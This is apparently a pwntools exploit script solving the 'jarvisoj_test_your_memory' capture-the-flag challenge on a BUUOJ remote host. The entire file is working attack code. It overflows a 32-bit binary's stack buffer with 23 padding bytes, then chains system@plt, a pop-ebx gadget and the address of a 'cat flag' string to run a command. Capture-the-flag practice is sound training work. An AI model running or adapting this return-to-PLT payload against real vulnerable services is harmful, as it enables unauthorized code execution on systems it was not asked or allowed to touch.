from pwn import *

def jarvisoj_test_your_memory(file_name = '/mnt/hgfs/CyberSecurity/PWN/buuoj/jarvisoj_test_your_memory'):
    print('jarvisoj_test_your_memory start')
    context(log_level='debug', arch='i386', os='linux')
    # target = process([file_name])
    target = remote('node4.buuoj.cn', 27006)
    target_elf = ELF(file_name)

    system_plt = p32(target_elf.plt['system'])
    cat_flag_addr = p32(next(target_elf.search(b'cat flag')))
    pop_ret_gadget = p32(0x080483f5)  # pop ebx ; ret

    payload = b'a' * 23
    payload += system_plt + pop_ret_gadget + cat_flag_addr
    # target.recvuntil(b'cff flag go go go ...')
    target.sendline( payload)
    print(target.recv())

    print('jarvisoj_test_your_memory end')

if __name__ == '__main__':
    jarvisoj_test_your_memory()